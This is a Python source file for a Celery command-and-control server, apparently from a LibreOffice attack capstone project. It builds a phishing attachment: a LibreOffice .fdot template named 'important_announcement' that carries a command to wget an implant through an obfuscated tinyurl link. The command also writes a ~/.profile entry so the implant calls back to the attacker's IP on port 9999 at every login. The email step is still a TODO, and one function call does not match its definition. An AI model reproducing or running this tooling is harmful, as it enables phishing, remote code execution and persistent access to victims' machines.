from celery import Celery
import socket

app = Celery('c2_server', broker='redis://redis:6379/0', backend='redis://redis:6379/0')

original_implant_addr = "https://github.com/d1lacy/LibreOfficeCapstone/raw/refs/heads/main/libutils-amd64"


# shortened for obfuscation
IMPLANT_ADDR = "https://tinyurl.com/ycxssc7p"\

PORT = 9999


@app.task
def execute_command(target, command):
    pass

@app.task
def execute_script(target, command):
    pass


def get_public_ip():
    try:
        # Connect to Google's public DNS server.  Doesn't send data, just establishes connection.
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        public_ip = s.getsockname()[0]
        s.close()
        return public_ip
    except socket.error as e:
        print(f"Error getting IP with socket: {e}")
        return None


def generate_implant_command(ip, implant_addr):
    get_implant = f"wget -O ~/libutils {implant_addr}"
    add_permissions = "chmod +x ~/libutils"
    run_implant_command = f"echo '~/libutils {ip} {PORT} >/dev/null 2>/dev/null' >> ~/.profile"
    command = f"{get_implant} ; {run_implant_command}" 
    return command


def generate_attachment(command, fingerprint):
    with open("attachments/template.fdot", "r") as f:
        template = f.read()
    
    implant = template.replace("**COMMAND**", command)
    outpath = f"attachments/important_announcement_{fingerprint}.fdot"
    with open(outpath, "w") as f:
        f.write(implant)

    return outpath

@app.task
def send_phishing_email(target, fingerprint):
    c2_ip = get_public_ip()
    implant_command = generate_implant_command(c2_ip, fingerprint, IMPLANT_ADDR)
    attachment_path = generate_attachment(implant_command, fingerprint)

    # TODO: send email with attachment